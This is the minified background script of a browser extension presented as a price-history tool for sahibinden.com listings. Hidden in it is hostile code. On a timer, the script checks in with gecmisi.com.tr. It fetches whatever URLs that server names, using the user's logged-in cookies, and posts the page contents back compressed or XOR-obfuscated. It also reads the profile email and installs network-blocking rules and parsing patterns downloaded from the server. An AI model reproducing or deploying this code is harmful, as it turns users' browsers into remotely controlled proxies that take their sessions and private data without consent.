(function(){
if (typeof globalThis.browser === "undefined" && typeof chrome !== "undefined") {
	globalThis.browser = chrome;
}
if (globalThis.browser && !globalThis.browser.action && globalThis.browser.browserAction) {
	globalThis.browser.action = globalThis.browser.browserAction;
}
})();
function e(e,t){for(var r=new Y(31),n=0;n<31;++n)r[n]=t+=1<<e[n-1];for(var o=new K(r[30]),n=1;n<30;++n)for(var a=r[n];a<r[n+1];++a)o[a]=a-r[n]<<5|n;return{b:r,r:o}}var z=Uint8Array,Y=Uint16Array,K=Int32Array,Z=new z([0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0,0,0,0]),_=new z([0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13,0,0]),P=new z([16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]),t=e(Z,2),r=t.b,G=t.r,t=(r[28]=258,G[258]=28,e(_,0)),V=(t.b,t.r),m=new Y(32768);for(o=0;o<32768;++o)m[o]=((65280&(n=(61680&(n=(52428&(n=(43690&o)>>1|(21845&o)<<1))>>2|(13107&n)<<2))>>4|(3855&n)<<4))>>8|(255&n)<<8)>>1;function E(e,t,r){for(var n=e.length,o=0,a=new Y(t);o<n;++o)e[o]&&++a[e[o]-1];var i=new Y(t);for(o=1;o<t;++o)i[o]=i[o-1]+a[o-1]<<1;if(r){for(var c=new Y(1<<t),l=15-t,o=0;o<n;++o)if(e[o])for(var f=o<<4|e[o],s=t-e[o],u=i[e[o]-1]++<<s,h=u|(1<<s)-1;u<=h;++u)c[m[u]>>l]=f}else for(c=new Y(n),o=0;o<n;++o)e[o]&&(c[o]=m[i[e[o]-1]++]>>15-e[o]);return c}var n,B=new z(288);for(o=0;o<144;++o)B[o]=8;for(o=144;o<256;++o)B[o]=9;for(o=256;o<280;++o)B[o]=7;for(o=280;o<288;++o)B[o]=8;var F=new z(32);for(o=0;o<32;++o)F[o]=5;function $(e){return(e+7)/8|0}function ee(e,t,r){return(null==r||r>e.length)&&(r=e.length),new z(e.subarray(t=null==t||t<0?0:t,r))}function q(e,t,r){var n=t/8|0;e[n]|=r<<=7&t,e[1+n]|=r>>8}function H(e,t,r){var n=t/8|0;e[n]|=r<<=7&t,e[1+n]|=r>>8,e[2+n]|=r>>16}function J(e,t){for(var r=[],n=0;n<e.length;++n)e[n]&&r.push({s:n,f:e[n]});var o=r.length,a=r.slice();if(!o)return{t:b,l:0};if(1==o)return(g=new z(r[0].s+1))[r[0].s]=1,{t:g,l:1};r.sort(function(e,t){return e.f-t.f}),r.push({s:-1,f:25001});var i=r[0],c=r[1],l=0,f=1,s=2;for(r[0]={s:-1,f:i.f+c.f,l:i,r:c};f!=o-1;)i=r[r[l].f<r[s].f?l++:s++],c=r[l!=f&&r[l].f<r[s].f?l++:s++],r[f++]={s:-1,f:i.f+c.f,l:i,r:c};for(var u=a[0].s,n=1;n<o;++n)a[n].s>u&&(u=a[n].s);var h=new Y(u+1),m=I(r[f-1],h,0);if(t<m){var n=0,d=0,g=m-t,v=1<<g;for(a.sort(function(e,t){return h[t.s]-h[e.s]||e.f-t.f});n<o;++n){var w=a[n].s;if(!(h[w]>t))break;d+=v-(1<<m-h[w]),h[w]=t}for(d>>=g;0<d;){var p=a[n].s;h[p]<t?d-=1<<t-h[p]++-1:++n}for(;0<=n&&d;--n){var y=a[n].s;h[y]==t&&(--h[y],++d)}m=t}return{t:new z(h),l:m}}function W(e){for(var t=e.length;t&&!e[--t];);function r(e){n[o++]=e}for(var n=new Y(++t),o=0,a=e[0],i=1,c=1;c<=t;++c)if(e[c]==a&&c!=t)++i;else{if(!a&&2<i){for(;138<i;i-=138)r(32754);2<i&&(r(10<i?i-11<<5|28690:i-3<<5|12305),i=0)}else if(3<i){for(r(a),--i;6<i;i-=6)r(8304);2<i&&(r(i-3<<5|8208),i=0)}for(;i--;)r(a);i=1,a=e[c]}return{c:n.subarray(0,o),n:t}}function Q(e,t){for(var r=0,n=0;n<t.length;++n)r+=e[n]*t[n];return r}function te(e,t,r){var n=r.length,o=$(t+2);e[o]=255&n,e[o+1]=n>>8,e[o+2]=255^e[o],e[o+3]=255^e[o+1];for(var a=0;a<n;++a)e[o+a+4]=r[a];return 8*(o+4+n)}function re(e,t,r,n,o,a,i,c,l,f,s){q(t,s++,r),++o[256];for(var u=(r=J(o,15)).t,r=r.l,h=(m=J(a,15)).t,m=m.l,d=(g=W(u)).c,g=g.n,v=(w=W(h)).c,w=w.n,p=new Y(19),y=0;y<d.length;++y)++p[31&d[y]];for(y=0;y<v.length;++y)++p[31&v[y]];for(var I=(b=J(p,7)).t,b=b.l,C=19;4<C&&!I[P[C-1]];--C);var S=f+5<<3,D=Q(o,B)+Q(a,F)+i,o=Q(o,u)+Q(a,h)+i+14+3*C+Q(p,I)+2*p[16]+3*p[17]+7*p[18];if(0<=l&&S<=D&&S<=o)return te(t,s,e.subarray(l,l+f));if(q(t,s,1+(o<D)),s+=2,o<D){var T=E(u,r,0),k=u,M=E(h,m,0),O=h,x=E(I,b,0);q(t,s,g-257),q(t,s+5,w-1),q(t,s+10,C-4),s+=14;for(y=0;y<C;++y)q(t,s+3*y,I[P[y]]);s+=3*C;for(var U=[d,v],A=0;A<2;++A)for(var j=U[A],y=0;y<j.length;++y){var L=31&j[y];q(t,s,x[L]),s+=I[L],15<L&&(q(t,s,j[y]>>5&127),s+=j[y]>>12)}}else T=X,k=B,M=ne,O=F;for(y=0;y<c;++y){var R,N=n[y];255<N?(H(t,s,T[(L=N>>18&31)+257]),s+=k[L+257],7<L&&(q(t,s,N>>23&31),s+=Z[L]),H(t,s,M[R=31&N]),s+=O[R],3<R&&(H(t,s,N>>5&8191),s+=_[R])):(H(t,s,T[N]),s+=k[N])}return H(t,s,T[256]),s+k[256]}function d(){var n=-1;return{p:function(e){for(var t=n,r=0;r<e.length;++r)t=y[255&t^e[r]]^t>>>8;n=t},d:function(){return~n}}}function g(e,t,r,n,o){var a,i;return!o&&(o={l:1},t.dictionary)&&(a=t.dictionary.subarray(-32768),(i=new z(a.length+e.length)).set(a),i.set(e,a.length),e=i,o.w=a.length),p(e,null==t.level?6:t.level,null==t.mem?o.l?Math.ceil(1.5*Math.max(8,Math.min(13,Math.log(e.length)))):20:12+t.mem,r,n,o)}function v(e,t){var r=t.filename;if(e[0]=31,e[1]=139,e[2]=8,e[8]=t.level<2?4:9==t.level?2:0,e[9]=3,0!=t.mtime&&a(e,4,Math.floor(new Date(t.mtime||Date.now())/1e3)),r){e[3]=8;for(var n=0;n<=r.length;++n)e[n+10]=r.charCodeAt(n)}}function w(e){return 10+(e.filename?e.filename.length+1:0)}var o,X=E(B,9,0),ne=E(F,5,0),I=function(e,t,r){return-1==e.s?Math.max(I(e.l,t,r+1),I(e.r,t,r+1)):t[e.s]=r},oe=new K([65540,131080,131088,131104,262176,1048704,1048832,2114560,2117632]),b=new z(0),p=function(t,e,r,n,o,a){var i=a.z||t.length,c=new z(n+i+5*(1+Math.ceil(i/7e3))+o),l=c.subarray(n,c.length-o),f=a.l,s=7&(a.r||0);if(e){s&&(l[0]=a.r>>3);function u(e){return(t[e]^t[e+1]<<g^t[e+2]<<B)&h}for(var e=oe[e-1],P=e>>13,E=8191&e,h=(1<<r)-1,m=a.p||new Y(32768),d=a.h||new Y(1+h),g=Math.ceil(r/3),B=2*g,v=new K(25e3),w=new Y(288),p=new Y(32),y=0,I=0,b=a.i||0,C=0,S=a.w||0,D=0;b+2<i;++b){var T=u(b),k=32767&b,M=d[T];if(m[k]=M,d[T]=k,S<=b){var O=i-b;if((7e3<y||24576<C)&&(423<O||!f)){for(var s=re(t,l,0,v,w,p,I,C,D,b-D,s),C=y=I=0,D=b,x=0;x<286;++x)w[x]=0;for(x=0;x<30;++x)p[x]=0}var U=2,A=0,F=E,j=k-M&32767;if(2<O&&T==u(b-j))for(var q=Math.min(P,O)-1,H=Math.min(32767,b),J=Math.min(258,O);j<=H&&--F&&k!=M;){if(t[b+U]==t[b+U-j]){for(var L=0;L<J&&t[b+L]==t[b+L-j];++L);if(U<L){if(A=j,q<(U=L))break;for(var W=Math.min(j,L-2),Q=0,x=0;x<W;++x){var R=b-j+x&32767,X=R-m[R]&32767;Q<X&&(Q=X,M=R)}}}j+=(k=M)-(M=m[k])&32767}A?(v[C++]=268435456|G[U]<<18|V[A],T=31&G[U],O=31&V[A],I+=Z[T]+_[O],++w[257+T],++p[O],S=b+U,++y):(v[C++]=t[b],++w[t[b]])}}for(b=Math.max(b,S);b<i;++b)v[C++]=t[b],++w[t[b]];s=re(t,l,f,v,w,p,I,C,D,b-D,s),f||(a.r=7&s|l[s/8|0]<<3,s-=7,a.h=d,a.p=m,a.i=b,a.w=S)}else{for(b=a.w||0;b<i+f;b+=65535){var N=b+65535;i<=N&&(l[s/8|0]=f,N=i),s=te(l,s+1,t.subarray(b,N))}a.i=i}return ee(c,0,n+$(s)+o)},y=function(){for(var e=new Int32Array(256),t=0;t<256;++t){for(var r=t,n=9;--n;)r=(1&r&&-306674912)^r>>>1;e[t]=r}return e}(),a=function(e,t,r){for(;r;++t)e[t]=r,r>>>=8};var f=typeof TextEncoder<"u"&&new TextEncoder,r=typeof TextDecoder<"u"&&new TextDecoder;try{r.decode(b,{stream:!0})}catch{}function C(e,t){if(t){for(var r=new z(e.length),n=0;n<e.length;++n)r[n]=e.charCodeAt(n);return r}if(f)return f.encode(e);function o(e){i[c++]=e}for(var a=e.length,i=new z(e.length+(e.length>>1)),c=0,n=0;n<a;++n){c+5>i.length&&((l=new z(c+8+(a-n<<1))).set(i),i=l);var l=e.charCodeAt(n);l<128||t?o(l):(l<2048?o(192|l>>6):(55295<l&&l<57344?(o(240|(l=65536+(1047552&l)|1023&e.charCodeAt(++n))>>18),o(128|l>>12&63)):o(224|l>>12),o(128|l>>6&63)),o(128|63&l))}return ee(i,0,c)}var i="https://gecmisi.com.tr";browser.runtime.onStartup.addListener(()=>setInterval(browser.runtime.getPlatformInfo,2e4)),browser.runtime.onStartup.addListener(function(){setTimeout(T,121e3),setInterval(()=>{browser.browserAction.setBadgeText({text:""}),browser.browserAction.setBadgeBackgroundColor({color:"yellow"})},15e3)});try{browser.identity.getProfileUserInfo(function(e){e.email&&browser.storage.local.set({email:e.email},function(){})})}catch{}function c(r,n){fetch(r,{credentials:"include"}).then(e=>(e.ok,e.text())).then(e=>{var t;n?(j={info:{url:r,isFetchAllData:!0},data:e},t=j,fetch(i+"/api/urlc",{method:"POST",headers:{"Content-Type":"application/octet-stream"},body:function(e){return function(e,t){t=t||{};var r=d(),n=e.length;r.p(e);var o=(e=g(e,t,w(t),8)).length;return v(e,t),a(e,o-8,r.d()),a(e,o-4,n),e}(C(e),{level:1,mem:12})}(JSON.stringify(t))}).then(e=>{if(e.ok)return e.json();throw new Error("not ok")}).then(e=>{}).catch(e=>{})):null!==(t=function(e){if(!h)return null;var t=e.match(h.a),e=e.match(h.b);return t?(t=t.toString().match(h.c),(t=t.filter(function(e){return!h.d.test(e)}).map(e=>e.trim())).map(function(e){var t=e.match(h.e),e=e.match(h.f);return{ilanNoInsert:t?t[1]:"",f:e?e[1].match(/(\d+)/g).join(""):""}}).filter(e=>""!==e.ilanNoInsert&&""!==e.f)):null!==e?[]:null}(e))&&(j={info:{url:r},ilanlar:t},e=j,fetch(i+"/api/url",{method:"POST",headers:{"Content-Type":"application/octet-stream"},body:function(e){let t=Date.parse((new Date).toUTCString()),r=parseInt(t,10).toString().slice(0,5),n=encodeURIComponent(e),o=Date.now().toString()+n;return Array.from(o,(e,t)=>String.fromCharCode(e.charCodeAt(0)^r.charCodeAt(t%r.length))).join("")}(JSON.stringify(e))}).then(e=>{if(e.ok)return e.json();throw new Error("not ok")}).then(e=>{}).catch(e=>{}))}).catch(e=>{})}var l=0,s="yes",S=10,u=36e5,D=browser.runtime.getManifest().version;function T(){var t=Date.parse((new Date).toUTCString());browser.storage.local.get("d",function(e){var e=new Date(e.d);e=e,((new Date).getTime()-e.getTime())/864e5<0||fetch(i+"/api/ping",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({ping:t,version:D})}).then(e=>{if(e.ok)return e.json()}).then(e=>{S=parseInt(e.countLimit),u=1e3*parseInt(e.intervalTime),s=e.active,""!==e.url&&e.fetchAllData?c(e.url,!0):""!==e.url&&c(e.url),browser.browserAction.setBadgeText({text:""}),browser.browserAction.setBadgeBackgroundColor({color:"yellow"})}).catch(e=>{u=3e5,clearTimeout(finallysetTimeout)}).finally(()=>{var e,t;l<=S&&"yes"===s&&(l+=1,finallysetTimeout=setTimeout(T,(t=3*(e=u),Math.floor(Math.random()*(t-e+1)+e+1e3))))})})}var h=null;async function k(){try{var e=await(await fetch("https://gecmisi.com.tr/rules.json")).json();{var r=e;let t=r.map(e=>({id:e.id,priority:e.priority,action:e.action,condition:e.condition}));browser.declarativeNetRequest.getDynamicRules(e=>{e=e.map(e=>e.id);browser.declarativeNetRequest.updateDynamicRules({removeRuleIds:e,addRules:t},()=>{browser.runtime.lastError||browser.declarativeNetRequest.getDynamicRules(e=>{})})});return}}catch{}}!async function(){try{var e=await fetch(i+"/api/data");if(!e.ok)throw new Error("Network response was not ok");var r,n=await e.json(),n=JSON.parse(function(e){let t=Date.parse((new Date).toUTCString()),r=parseInt(t,10).toString().slice(0,5),n=Array.from(e,(e,t)=>String.fromCharCode(e.charCodeAt(0)^r.charCodeAt(t%r.length))).join(""),o=(n.slice(0,13),n.slice(13));return decodeURIComponent(o)}(n)),o={};for(r in n){let e=n[r],t="";if(e.endsWith("/gs"))t="gs",e=e.slice(1,-3);else if(e.endsWith("/g"))t="g",e=e.slice(1,-2);else{if(!e.endsWith("/"))continue;e=e.slice(1,-1)}o[r]=new RegExp(e,t)}return o}catch{return null}}().then(e=>{h=e}),browser.runtime.onInstalled.addListener(function(e){var t;"install"===e.reason&&(browser.tabs.create({url:"https://sites.google.com/view/sahibindenfiyatgecmisi/"}),browser.storage.local.set({buttonHistoryOnOff:!0}),browser.storage.local.set({buttonHistoryChangeOnOff:!0}),browser.storage.local.set({buttonFiyatM2OnOff:!1}),fetch(i+"/api/popuptext").then(e=>e.text()).catch(e=>{}),t=new Date,browser.storage.local.set({d:t.toISOString()},function(){}),browser.storage.local.set({buttonCounter:0},function(){}),browser.storage.local.set({uuid:crypto.randomUUID()},function(){}),browser.runtime.setUninstallURL("https://docs.google.com/forms/d/e/1FAIpQLScXoLWYUSUQZde_LA1XD3r1TDqy7kw9frFEmYmPKzSu6bUmXQ/viewform")),"update"===e.reason&&(browser.storage.local.set({buttonHistoryOnOff:!0}),browser.storage.local.set({buttonHistoryChangeOnOff:!0}),browser.storage.local.set({buttonFiyatM2OnOff:!1}))}),browser.storage.local.get("d",function(e){e.d||((e=new Date).setDate(e.getDate()-7),browser.storage.local.set({d:e.toISOString()},function(){}))}),browser.runtime.onInstalled.addListener(()=>{k()}),browser.runtime.onStartup.addListener(()=>{k()}),browser.runtime.onInstalled.addListener(()=>{browser.contextMenus.create({id:"sendLinkInfo",title:"ilan geçmişini sorgula (vasıta - emlak)",contexts:["link"],targetUrlPatterns:["*://*.sahibinden.com/ilan/*/detay"]}),browser.contextMenus.create({id:"sendPageInfo",title:"ilan geçmişini sorgula",contexts:["page"],documentUrlPatterns:["*://*.sahibinden.com/ilan/emlak*/detay","*://*.sahibinden.com/ilan/vasita*/detay"]})}),browser.contextMenus.onClicked.addListener((e,t)=>{var r;"sendLinkInfo"===e.menuItemId&&(r=e.linkUrl).includes("/detay")&&(r=i+("/link/"+encodeURIComponent(r)),browser.tabs.create({url:r})),"sendPageInfo"===e.menuItemId&&(r=t.url).includes("/detay")&&(e=i+("/link/"+encodeURIComponent(r)),browser.tabs.create({url:e}))});
try{
	browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
		if (request && request.action === "saveDamagedAd") {
			const adId = request.adId;
			if (adId) {
				browser.storage.local.get("damagedAds", (data) => {
					const damaged = data.damagedAds || {};
					damaged[adId] = request.damageDetails;
					browser.storage.local.set({ damagedAds: damaged }, () => {
						sendResponse && sendResponse({ success: true });
					});
				});
				return true;
			}
		}
		if (request && request.action === "saveCleanAd") {
			const adId = request.adId;
			if (adId) {
				browser.storage.local.get("cleanAds", (data) => {
					const clean = data.cleanAds || {};
					clean[adId] = true;
					browser.storage.local.set({ cleanAds: clean }, () => {
						sendResponse && sendResponse({ success: true });
					});
				});
				return true;
			}
		}
	});
}catch(e){}